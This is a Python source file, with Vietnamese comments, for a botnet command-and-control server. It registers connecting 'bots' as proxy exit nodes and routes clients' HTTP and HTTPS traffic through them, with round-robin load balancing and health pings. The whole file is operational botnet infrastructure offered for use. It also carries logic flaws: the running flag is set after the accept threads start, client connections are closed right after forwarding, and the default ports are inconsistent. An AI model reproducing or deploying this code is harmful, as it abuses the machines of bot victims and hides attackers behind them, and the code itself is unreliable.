#!/usr/bin/env python3
"""
C2 PROXY SERVER
Server chính nhận proxy requests từ client và forward qua các bot exit nodes
"""

import socket
import threading
import time
import json
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Optional
from collections import deque
import random
import ssl

class C2ProxyServer:
    def __init__(self, c2_host="0.0.0.0", c2_port=3333, proxy_port=8080):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.proxy_port = proxy_port
        
        # Bot management
        self.connected_bots = {}  # bot_id -> bot_info
        self.bot_exit_nodes = {}  # bot_id -> exit_node_info
        self.active_proxy_connections = {}
        
        # Load balancing
        self.load_balancer = ProxyLoadBalancer()
        self.health_monitor = BotHealthMonitor()
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'total_bytes_transferred': 0,
            'active_connections': 0,
            'failed_requests': 0,
            'start_time': datetime.now()
        }
        
        # Server sockets
        self.c2_socket = None
        self.proxy_socket = None
        self.running = False
        
    def start(self):
        """Khởi động C2 Proxy Server"""
        print("🚀 Starting C2 Proxy Server...")
        
        # Khởi động C2 server để nhận bot connections
        self.start_c2_server()
        
        # Khởi động proxy server để nhận client requests
        self.start_proxy_server()
        
        # Khởi động health monitoring
        self.start_health_monitoring()
        
        self.running = True
        print(f"✅ C2 Proxy Server started successfully!")
        print(f"   C2 Server: {self.c2_host}:{self.c2_port}")
        print(f"   Proxy Server: {self.c2_host}:{self.proxy_port}")
        
    def start_c2_server(self):
        """Khởi động C2 server để nhận kết nối từ bot"""
        self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c2_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.c2_socket.bind((self.c2_host, self.c2_port))
        self.c2_socket.listen(100)
        
        # Thread để accept bot connections
        threading.Thread(target=self.accept_bot_connections, daemon=True).start()
        
    def start_proxy_server(self):
        """Khởi động proxy server để nhận requests từ client"""
        self.proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.proxy_socket.bind((self.c2_host, self.proxy_port))
        self.proxy_socket.listen(100)
        
        # Thread để accept proxy requests
        threading.Thread(target=self.accept_proxy_requests, daemon=True).start()
        
    def accept_bot_connections(self):
        """Accept kết nối từ bot"""
        while self.running:
            try:
                bot_socket, bot_addr = self.c2_socket.accept()
                print(f"🤖 New bot connection from {bot_addr}")
                
                # Thread để xử lý bot
                threading.Thread(
                    target=self.handle_bot_connection,
                    args=(bot_socket, bot_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting bot connection: {e}")
                    
    def accept_proxy_requests(self):
        """Accept proxy requests từ client"""
        while self.running:
            try:
                client_socket, client_addr = self.proxy_socket.accept()
                print(f"🌐 New proxy request from {client_addr}")
                
                # Thread để xử lý proxy request
                threading.Thread(
                    target=self.handle_proxy_request,
                    args=(client_socket, client_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting proxy request: {e}")
                    
    def handle_bot_connection(self, bot_socket, bot_addr):
        """Xử lý kết nối từ bot"""
        bot_id = None
        try:
            # Nhận thông tin bot
            data = bot_socket.recv(1024).decode().strip()
            if data.startswith("BOT_CONNECT:"):
                parts = data.split(":")
                if len(parts) >= 4:
                    bot_id = parts[1]
                    hostname = parts[2]
                    pid = parts[3]
                    
                    # Lưu thông tin bot
                    self.connected_bots[bot_id] = {
                        'socket': bot_socket,
                        'address': bot_addr,
                        'hostname': hostname,
                        'pid': pid,
                        'connected_at': datetime.now(),
                        'status': 'online',
                        'proxy_mode': False,
                        'requests_handled': 0,
                        'bytes_transferred': 0,
                        'last_seen': datetime.now()
                    }
                    
                    print(f"✅ Bot {bot_id} ({hostname}) connected successfully")
                    
                    # Gửi lệnh bật proxy mode
                    self.enable_bot_proxy_mode(bot_id)
                    
                    # Xử lý commands từ bot
                    self.handle_bot_commands(bot_id, bot_socket)
                    
        except Exception as e:
            print(f"❌ Error handling bot {bot_id}: {e}")
        finally:
            if bot_id and bot_id in self.connected_bots:
                self.disconnect_bot(bot_id)
                
    def enable_bot_proxy_mode(self, bot_id):
        """Bật chế độ proxy cho bot"""
        try:
            bot_info = self.connected_bots[bot_id]
            bot_socket = bot_info['socket']
            
            # Gửi lệnh bật proxy mode
            command = "ENABLE_PROXY_MODE"
            bot_socket.send(command.encode())
            
            # Đăng ký bot làm exit node
            self.bot_exit_nodes[bot_id] = {
                'bot_id': bot_id,
                'status': 'active',
                'connections': 0,
                'max_connections': 50,
                'health_score': 100,
                'response_time': deque(maxlen=100),
                'last_health_check': datetime.now(),
                'total_requests': 0,
                'successful_requests': 0,
                'failed_requests': 0
            }
            
            bot_info['proxy_mode'] = True
            print(f"🔗 Bot {bot_id} enabled as proxy exit node")
            
        except Exception as e:
            print(f"❌ Error enabling proxy mode for bot {bot_id}: {e}")
            
    def handle_bot_commands(self, bot_id, bot_socket):
        """Xử lý commands từ bot"""
        while self.running and bot_id in self.connected_bots:
            try:
                data = bot_socket.recv(4096).decode().strip()
                if not data:
                    break
                    
                if data == "PONG":
                    # Update last seen
                    self.connected_bots[bot_id]['last_seen'] = datetime.now()
                    
                elif data.startswith("PROXY_RESPONSE:"):
                    # Nhận response từ bot
                    self.handle_bot_proxy_response(bot_id, data[15:])
                    
                elif data.startswith("PROXY_ERROR:"):
                    # Nhận error từ bot
                    self.handle_bot_proxy_error(bot_id, data[12:])
                    
                elif data.startswith("HEALTH_REPORT:"):
                    # Nhận health report từ bot
                    self.handle_bot_health_report(bot_id, data[14:])
                    
            except Exception as e:
                print(f"❌ Error handling commands from bot {bot_id}: {e}")
                break
                
    def handle_proxy_request(self, client_socket, client_addr):
        """Xử lý proxy request từ client"""
        connection_id = f"{client_addr[0]}:{client_addr[1]}:{int(time.time())}"
        
        try:
            # Đọc HTTP request
            request_data = client_socket.recv(4096)
            if not request_data:
                return
                
            # Parse HTTP request
            request_str = request_data.decode()
            target_host, target_port, is_https = self.parse_http_request(request_str)
            
            if not target_host:
                client_socket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")
                return
                
            # Chọn bot exit node
            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes)
            if not selected_bot:
                client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
                return
                
            # Tạo proxy connection
            self.active_proxy_connections[connection_id] = {
                'client_socket': client_socket,
                'client_addr': client_addr,
                'bot_id': selected_bot,
                'target_host': target_host,
                'target_port': target_port,
                'is_https': is_https,
                'start_time': datetime.now(),
                'bytes_transferred': 0
            }
            
            # Forward request đến bot
            self.forward_request_to_bot(connection_id, request_data)
            
            # Update statistics
            self.stats['total_requests'] += 1
            self.stats['active_connections'] += 1
            
        except Exception as e:
            print(f"❌ Error handling proxy request: {e}")
            self.stats['failed_requests'] += 1
        finally:
            if connection_id in self.active_proxy_connections:
                self.cleanup_proxy_connection(connection_id)
                
    def parse_http_request(self, request_str):
        """Parse HTTP request để lấy target host và port"""
        try:
            lines = request_str.split('\n')
            first_line = lines[0].strip()
            
            if first_line.startswith('CONNECT'):
                # HTTPS CONNECT method
                parts = first_line.split()
                if len(parts) >= 2:
                    host_port = parts[1]
                    if ':' in host_port:
                        host, port = host_port.split(':', 1)
                        return host, int(port), True
                    else:
                        return host_port, 443, True
                        
            elif first_line.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS')):
                # HTTP request
                for line in lines:
                    if line.lower().startswith('host:'):
                        host_port = line.split(':', 1)[1].strip()
                        if ':' in host_port:
                            host, port = host_port.split(':', 1)
                            return host, int(port), False
                        else:
                            return host_port, 80, False
                            
        except Exception as e:
            print(f"❌ Error parsing HTTP request: {e}")
            
        return None, None, False
        
    def forward_request_to_bot(self, connection_id, request_data):
        """Forward request đến bot exit node"""
        try:
            connection = self.active_proxy_connections[connection_id]
            bot_id = connection['bot_id']
            bot_info = self.connected_bots[bot_id]
            bot_socket = bot_info['socket']
            
            # Tạo command để gửi đến bot
            command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{connection['is_https']}"
            bot_socket.send(command.encode())
            
            # Gửi request data
            bot_socket.send(request_data)
            
            # Update bot statistics
            self.bot_exit_nodes[bot_id]['connections'] += 1
            self.bot_exit_nodes[bot_id]['total_requests'] += 1
            
        except Exception as e:
            print(f"❌ Error forwarding request to bot: {e}")
            self.stats['failed_requests'] += 1
            
    def handle_bot_proxy_response(self, bot_id, response_data):
        """Xử lý response từ bot"""
        try:
            # Parse response để lấy connection_id
            lines = response_data.split('\n')
            if lines[0].startswith('CONNECTION_ID:'):
                connection_id = lines[0].split(':', 1)[1]
                actual_response = '\n'.join(lines[1:])
                
                if connection_id in self.active_proxy_connections:
                    connection = self.active_proxy_connections[connection_id]
                    client_socket = connection['client_socket']
                    
                    # Forward response về client
                    client_socket.send(actual_response.encode())
                    
                    # Update statistics
                    bytes_transferred = len(actual_response)
                    connection['bytes_transferred'] += bytes_transferred
                    self.stats['total_bytes_transferred'] += bytes_transferred
                    
                    # Update bot statistics
                    self.bot_exit_nodes[bot_id]['successful_requests'] += 1
                    self.connected_bots[bot_id]['bytes_transferred'] += bytes_transferred
                    
        except Exception as e:
            print(f"❌ Error handling bot proxy response: {e}")
            
    def handle_bot_proxy_error(self, bot_id, error_data):
        """Xử lý error từ bot"""
        try:
            # Parse error để lấy connection_id
            if error_data.startswith('CONNECTION_ID:'):
                connection_id = error_data.split(':', 1)[1]
                
                if connection_id in self.active_proxy_connections:
                    connection = self.active_proxy_connections[connection_id]
                    client_socket = connection['client_socket']
                    
                    # Gửi error response về client
                    error_response = "HTTP/1.1 502 Bad Gateway\r\n\r\n"
                    client_socket.send(error_response.encode())
                    
                    # Update statistics
                    self.bot_exit_nodes[bot_id]['failed_requests'] += 1
                    self.stats['failed_requests'] += 1
                    
        except Exception as e:
            print(f"❌ Error handling bot proxy error: {e}")
            
    def handle_bot_health_report(self, bot_id, health_data):
        """Xử lý health report từ bot"""
        try:
            health_info = json.loads(health_data)
            
            if bot_id in self.bot_exit_nodes:
                self.bot_exit_nodes[bot_id]['health_score'] = health_info.get('health_score', 100)
                self.bot_exit_nodes[bot_id]['last_health_check'] = datetime.now()
                
                # Update response time
                if 'response_time' in health_info:
                    self.bot_exit_nodes[bot_id]['response_time'].append(health_info['response_time'])
                    
        except Exception as e:
            print(f"❌ Error handling bot health report: {e}")
            
    def cleanup_proxy_connection(self, connection_id):
        """Cleanup proxy connection"""
        if connection_id in self.active_proxy_connections:
            connection = self.active_proxy_connections[connection_id]
            
            # Close client socket
            try:
                connection['client_socket'].close()
            except:
                pass
                
            # Update bot statistics
            bot_id = connection['bot_id']
            if bot_id in self.bot_exit_nodes:
                self.bot_exit_nodes[bot_id]['connections'] = max(0, 
                    self.bot_exit_nodes[bot_id]['connections'] - 1)
                    
            # Update global statistics
            self.stats['active_connections'] = max(0, 
                self.stats['active_connections'] - 1)
                
            # Remove connection
            del self.active_proxy_connections[connection_id]
            
    def disconnect_bot(self, bot_id):
        """Disconnect bot"""
        if bot_id in self.connected_bots:
            bot_info = self.connected_bots[bot_id]
            
            # Close bot socket
            try:
                bot_info['socket'].close()
            except:
                pass
                
            # Remove from exit nodes
            if bot_id in self.bot_exit_nodes:
                del self.bot_exit_nodes[bot_id]
                
            # Remove from connected bots
            del self.connected_bots[bot_id]
            
            print(f"👋 Bot {bot_id} disconnected")
            
    def start_health_monitoring(self):
        """Khởi động health monitoring"""
        def monitor_health():
            while self.running:
                try:
                    self.health_monitor.check_bot_health(self.connected_bots, self.bot_exit_nodes)
                    time.sleep(30)  # Check every 30 seconds
                except Exception as e:
                    print(f"❌ Error in health monitoring: {e}")
                    
        threading.Thread(target=monitor_health, daemon=True).start()
        
    def get_status(self):
        """Lấy trạng thái server"""
        return {
            'running': self.running,
            'connected_bots': len(self.connected_bots),
            'active_exit_nodes': len(self.bot_exit_nodes),
            'active_proxy_connections': len(self.active_proxy_connections),
            'stats': self.stats,
            'bots': list(self.connected_bots.keys()),
            'exit_nodes': list(self.bot_exit_nodes.keys())
        }
        
    def stop(self):
        """Dừng server"""
        print("🛑 Stopping C2 Proxy Server...")
        self.running = False
        
        # Close all connections
        for connection in self.active_proxy_connections.values():
            try:
                connection['client_socket'].close()
            except:
                pass
                
        for bot_info in self.connected_bots.values():
            try:
                bot_info['socket'].close()
            except:
                pass
                
        # Close server sockets
        if self.c2_socket:
            self.c2_socket.close()
        if self.proxy_socket:
            self.proxy_socket.close()
            
        print("✅ C2 Proxy Server stopped")

class ProxyLoadBalancer:
    def __init__(self):
        self.current_bot_index = 0
        
    def select_bot(self, bot_exit_nodes, strategy="round_robin"):
        """Chọn bot exit node"""
        if not bot_exit_nodes:
            return None
            
        active_bots = {bot_id: info for bot_id, info in bot_exit_nodes.items() 
                      if info['status'] == 'active' and info['health_score'] > 50}
        
        if not active_bots:
            return None
            
        if strategy == "round_robin":
            bot_ids = list(active_bots.keys())
            selected_bot = bot_ids[self.current_bot_index % len(bot_ids)]
            self.current_bot_index += 1
            return selected_bot
            
        elif strategy == "least_connections":
            return min(active_bots.keys(), 
                      key=lambda x: active_bots[x]['connections'])
                      
        elif strategy == "health_based":
            return max(active_bots.keys(), 
                      key=lambda x: active_bots[x]['health_score'])
                      
        elif strategy == "random":
            return random.choice(list(active_bots.keys()))
            
        return list(active_bots.keys())[0]

class BotHealthMonitor:
    def __init__(self):
        self.health_check_interval = 30
        
    def check_bot_health(self, connected_bots, bot_exit_nodes):
        """Kiểm tra sức khỏe bot"""
        current_time = datetime.now()
        
        for bot_id, bot_info in connected_bots.items():
            try:
                # Check if bot is responsive
                last_seen = bot_info['last_seen']
                time_diff = (current_time - last_seen).total_seconds()
                
                if time_diff > 60:  # No response for 1 minute
                    bot_info['status'] = 'offline'
                    if bot_id in bot_exit_nodes:
                        bot_exit_nodes[bot_id]['status'] = 'offline'
                        
                # Send ping to bot
                bot_socket = bot_info['socket']
                bot_socket.send("PING".encode())
                
            except Exception as e:
                print(f"❌ Health check failed for bot {bot_id}: {e}")
                bot_info['status'] = 'offline'
                if bot_id in bot_exit_nodes:
                    bot_exit_nodes[bot_id]['status'] = 'offline'

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Proxy Server")
    parser.add_argument("--c2-host", default="0.0.0.0", help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=7777, help="C2 server port")
    parser.add_argument("--proxy-port", type=int, default=8080, help="Proxy server port")
    
    args = parser.parse_args()
    
    # Create and start server
    server = C2ProxyServer(args.c2_host, args.c2_port, args.proxy_port)
    
    try:
        server.start()
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        server.stop()

if __name__ == "__main__":
    main()
